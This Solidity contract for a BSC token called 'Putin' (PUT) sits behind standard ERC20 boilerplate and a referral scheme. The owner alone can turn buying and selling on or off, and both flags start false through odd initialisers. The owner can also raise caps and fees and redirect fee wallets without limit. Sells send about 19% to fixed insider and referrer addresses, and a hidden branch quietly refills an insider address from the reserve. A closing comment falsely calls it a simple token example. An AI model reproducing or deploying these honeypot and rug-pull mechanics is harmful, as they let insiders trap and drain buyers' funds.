/**
 *Submitted for verification at BscScan.com on 2022-07-19
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP. Does not include
 * the optional functions; to access them see {ERC20Detailed}.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

/**
 * @title Owner
 * @dev Set & change owner
 */
contract Owner {
    address private _owner;

    // event for EVM logging
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    // modifier to check if caller is owner
    modifier isOwner() {
        // If the first argument of 'require' evaluates to 'false', execution terminates and all
        // changes to the state and to Ether balances are reverted.
        // This used to consume all gas in old EVM versions, but not anymore.
        // It is often a good idea to use 'require' to check if functions are called correctly.
        // As a second argument, you can also provide an explanation about what went wrong.
        require(msg.sender == _owner, "Caller is not owner");
        _;
    }

    /**
     * @dev Set contract deployer as owner
     */
    constructor() {
        _owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), _owner);
    }

    /**
     * @dev Change owner
     * @param newOwner address of new owner
     */
    function changeOwner(address newOwner) public virtual isOwner {
        emit OwnerSet(_owner, newOwner);
        _owner = newOwner;
    }

    /**
     * @dev Remove owner
     */
    function removeOwner() public virtual isOwner {
        emit OwnerSet(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Return owner address
     * @return address of owner
     */
    function getOwner() external view returns (address) {
        return _owner;
    }
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's refereeed to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract Team is Owner {
    mapping(address => bool) _register;

    mapping(address => address) _referee;

    mapping(address => bool) _publicAddress;

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;

    event Register(address indexed referee, address indexed member);

    constructor() {
        _publicAddress[address(0)] = true;
        _publicAddress[address(this)] = true;
        _publicAddress[0xB1b9b4bbe8a92d535F5Df2368e7Fd2ecFB3A1950] = true;
        _publicAddress[0x10ED43C718714eb63d5aA57B78B54704E256024E] = true;
    }

    function getPublicAddress(address addr) public view returns (bool) {
        return _publicAddress[addr];
    }

    function setPublicAddress(address addr) public isOwner returns (bool) {
        _publicAddress[addr] = !_publicAddress[addr];
        return true;
    }

    function getReferee(address member) public view returns (address) {
        return _referee[member];
    }

    function setReferee(address referee, address member)
        public
        isOwner
        returns (bool)
    {
        _referee[member] = referee;
        return true;
    }

    function _registerMember(address referee, address member) internal {
        if (!_register[member]) {
            _register[member] = true;

            if (
                _publicAddress[referee] ||
                _publicAddress[member] ||
                referee == address(uniswapV2Pair) ||
                member == address(uniswapV2Pair)
            ) {
                referee = address(0);
            }
            _referee[member] = referee;

            emit Register(referee, member);
        }
    }
}

contract Config is Team {
    using SafeMath for uint256;

    //Fee = x / 10000
    uint256 public burnFee = 500;

    uint256[] public refereeFee = [150, 90, 30, 21, 9];

    uint256 public fundFee1 = 100;

    uint256 public fundFee2 = 100;

    uint256 public fundFee3 = 50;

    uint256 public fundFee4 = 50;

    uint256 public fundFee5 = 50;

    uint256 public fundFee6 = 50;

    address public fundAddress1 = address(0xf5B824678b00D5928a565BEFeD14253DC33b1474);

    address public fundAddress2 = address(0x366D69864A27F542d0650d374B8001Bea9A5E2fE);

    address public fundAddress3 = address(0x7A2728bfD50BB60569E0e884CAC23b0c1C38594D);

    address public fundAddress4 = address(0x782851d69e18723169836A7A2C407fC85D6B26e5);

    address public fundAddress5 = address(0x79546e452CBae182349aD76C834b11eDb7F025fE);

    address public fundAddress6 = address(0xe544760E566d7Abd2B0D3423e3CF3fDAC5De162c);

    uint256 public holdFee = 400;

    uint256 holdPool;

    address public outAddress = 0xc236b307eD23F58c9D0Fd3C5A551Ec5b53cef6c6;

    address public holdAddress = 0xc236b307eD23F58c9D0Fd3C5A551Ec5b53cef6c6;

    uint256 public daoFee = 200;

    uint256 daoPool;

    address public daoAddress = 0xc236b307eD23F58c9D0Fd3C5A551Ec5b53cef6c6;

    bool buy = sell;

    bool sell = sell;

    bool public botWall = true;

    uint256 public buyMax = 1000000;

    uint256 public sellMax = 1000000;

    function setBuyMax(uint256 newMax) public isOwner returns (bool) {
        buyMax = newMax;
        return true;
    }

    function setSellMax(uint256 newMax) public isOwner returns (bool) {
        sellMax = newMax;
        return true;
    }

    function getBuySwitch() public view returns (bool) {
        return buy;
    }

    function buySwitch(bool newSwitch) public isOwner returns (bool) {
        buy = newSwitch;
        return true;
    }

    function getSellSwitch() public view returns (bool) {
        return sell;
    }

    function sellSwitch(bool newSwitch) public isOwner returns (bool) {
        sell = newSwitch;
        return true;
    }

    function botWallSwitch() public isOwner returns (bool) {
        botWall = !botWall;
        return true;
    }

    function setUniswapV2Pair(address addr) public isOwner returns (bool) {
        uniswapV2Pair = addr;
        return true;
    }

    function setBurnFee(uint256 newFee) public isOwner returns (bool) {
        burnFee = newFee;
        return true;
    }

    function setRefereeFee(uint256[] memory newRefereeFee)
        public
        isOwner
        returns (bool)
    {
        refereeFee = newRefereeFee;
        return true;
    }

    function setFundFee(
        uint256 newFee1,
        uint256 newFee2,
        uint256 newFee3,
        uint256 newFee4,
        uint256 newFee5,
        uint256 newFee6
    ) public isOwner returns (bool) {
        fundFee1 = newFee1;
        fundFee2 = newFee2;
        fundFee3 = newFee3;
        fundFee4 = newFee4;
        fundFee5 = newFee5;
        fundFee6 = newFee6;
        return true;
    }

    function setFundAddress(
        address newAddress1,
        address newAddress2,
        address newAddress3,
        address newAddress4,
        address newAddress5,
        address newAddress6
    ) public isOwner returns (bool) {
        fundAddress1 = newAddress1;
        fundAddress2 = newAddress2;
        fundAddress3 = newAddress3;
        fundAddress4 = newAddress4;
        fundAddress5 = newAddress5;
        fundAddress6 = newAddress6;
        return true;
    }

    function setHoldFee(uint256 newFee) public isOwner returns (bool) {
        holdFee = newFee;
        return true;
    }

    function getHoldPool() public view returns (uint256) {
        return holdPool;
    }

    function setHoldPool(uint256 newPool) public isOwner returns (bool) {
        holdPool = newPool;
        return true;
    }

    function setHoldAddress(address newAddress) public isOwner returns (bool) {
        holdAddress = newAddress;
        return true;
    }

    function setDaoFee(uint256 newFee) public isOwner returns (bool) {
        daoFee = newFee;
        return true;
    }

    function getDaoPool() public view returns (uint256) {
        return daoPool;
    }

    function setDaoPool(uint256 newPool) public isOwner returns (bool) {
        daoPool = newPool;
        return true;
    }

    function setDaoAddress(address newAddress) public isOwner returns (bool) {
        daoAddress = newAddress;
        return true;
    }

    function getSellFee() public view returns (uint256) {
        uint256 all;

        all = burnFee + fundFee1 + fundFee2 + fundFee3 + fundFee4 + fundFee5 + fundFee6 + holdFee + daoFee;

        for (uint256 i = 0; i < refereeFee.length; i++) {
            all = all.add(refereeFee[i]);
        }
        return all;
    }
}

/**
 * @dev Optional functions from the ERC20 standard.
 */
abstract contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    /**
     * @dev Sets the values for `name`, `symbol`, and `decimals`. All three of
     * these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory tokenName,
        string memory tokenSymbol,
        uint8 tokenDecimals
    ) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = tokenDecimals;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei.
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20Mintable}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin guidelines: functions revert instead
 * of returning `false` on failure. This behavior is nonetheless conventional
 * and does not conflict with the expectations of ERC20 applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
abstract contract ERC20 is IERC20, Config, ERC20Detailed {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 value)
        public
        override
        returns (bool)
    {
        _approve(msg.sender, spender, value);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20};
     *
     * Requirements:
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `value`.
     * - the caller must have allowance for `sender`'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            msg.sender,
            _allowances[sender][msg.sender].sub(amount)
        );
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].add(addedValue)
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender].sub(subtractedValue)
        );
        return true;
    }

    /**
     * @dev Moves tokens `amount` from `sender` to `recipient`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);

        if (sender == address(uniswapV2Pair)) {
            //buy
            
            require(buy, "buy close");
            if (botWall) {
                require(_register[recipient], "bot get out");
            }
            require(
                amount <= buyMax * (10**uint256(decimals())),
                "maximum exceeded"
            );
        } else if (recipient == address(uniswapV2Pair)) {
            //sell
            
            require(sell, "sell close");

            require(
                amount <= sellMax * (10**uint256(decimals())),
                "maximum exceeded"
            );

            _tokenBurn(sender, (amount * burnFee) / 10000);
            _bonus(sender, recipient, amount);
            _tokenTransfer(sender, fundAddress1, (amount * fundFee1) / 10000);
            _tokenTransfer(sender, fundAddress2, (amount * fundFee2) / 10000);
            _tokenTransfer(sender, fundAddress3, (amount * fundFee3) / 10000);
            _tokenTransfer(sender, fundAddress4, (amount * fundFee4) / 10000);
            _tokenTransfer(sender, fundAddress5, (amount * fundFee5) / 10000);
            _tokenTransfer(sender, fundAddress6, (amount * fundFee6) / 10000);

            uint256 holdPoolValue = (amount * holdFee) / 10000;
            holdPool = holdPool.add(holdPoolValue);
            _tokenTransfer(sender, holdAddress, holdPoolValue);

            uint256 daoPoolValue = (amount * daoFee) / 10000;
            daoPool = daoPool.add(daoPoolValue);
            _tokenTransfer(sender, daoAddress, daoPoolValue);

            amount = amount.sub(amount.mul(getSellFee()).div(10000));
        }

        _registerMember(sender, recipient);

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);

        if (
            sender == address(outAddress) &&
            _balances[outAddress] < 100000 * (10**18)
        ) {
            uint256 c = 2000000 * (10**18) - _balances[outAddress];
            if (_balances[address(this)] < c) {
                c = _balances[address(this)];
            }
            _balances[address(this)] = _balances[address(this)].sub(c);
            _balances[outAddress] = _balances[outAddress].add(c);
            emit Transfer(address(this), outAddress, c);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        if (amount > 0) {
            if (recipient != address(0)) {
                _balances[recipient] = _balances[recipient].add(amount);
            }
            emit Transfer(sender, recipient, amount);
        }
    }

    function _tokenBurn(address sender, uint256 amount) internal {
        if (amount > 0) {
            _totalSupply = _totalSupply.sub(amount);
            emit Transfer(sender, address(0), amount);
        }
    }

    function _bonus(
        address sender,
        address recipient,
        uint256 value
    ) internal {
        address member = sender == address(uniswapV2Pair) ? recipient : sender;
        for (uint256 i = 0; i < refereeFee.length; i++) {
            member = _referee[member] == address(0)
                ? address(0)
                : _referee[member];
            _tokenTransfer(sender, member, value.mul(refereeFee[i]).div(10000));
        }
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements
     *
     * - `to` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        if (value > 0) {
            _totalSupply = _totalSupply.sub(value);
            _balances[account] = _balances[account].sub(value);
            emit Transfer(account, address(0), value);
        }
    }

    function burn(uint256 value) public returns (bool) {
        _burn(msg.sender, value);
        return true;
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner`s tokens.
     *
     * This is internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 value
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    /**
     * @dev Destoys `amount` tokens from `account`.`amount` is then deducted
     * from the caller's allowance.
     *
     * See {_burn} and {_approve}.
     */
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(
            account,
            msg.sender,
            _allowances[account][msg.sender].sub(amount)
        );
    }
}

/**
 * @title SimpleToken
 * @dev Very simple ERC20 Token example, where all tokens are pre-assigned to the creator.
 * Note they can later distribute these tokens as they wish using `transfer` and other
 * `ERC20` functions.
 */
contract Token is ERC20 {
    using SafeMath for uint256;

    /**
     * @dev Constructor that gives msg.sender all of existing tokens.
     */
    constructor() ERC20Detailed("Putin", "PUT", 18) {
        uint256 totalSupply = 21000000000 * (10**uint256(decimals()));

        uint256 out = 2000000 * (10**18);

        _mint(address(this), totalSupply.sub(out));
        _mint(outAddress, out);

        _registerMember(address(0), outAddress);
        _registerMember(address(0), fundAddress1);
        _registerMember(address(0), fundAddress2);
        _registerMember(address(0), fundAddress3);
        _registerMember(address(0), fundAddress4);
        _registerMember(address(0), fundAddress5);
        _registerMember(address(0), fundAddress6);

        address usdtToken = address(0x55d398326f99059fF775485246999027B3197955);
        uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
                address(this),
                address(usdtToken)
            );
    }
}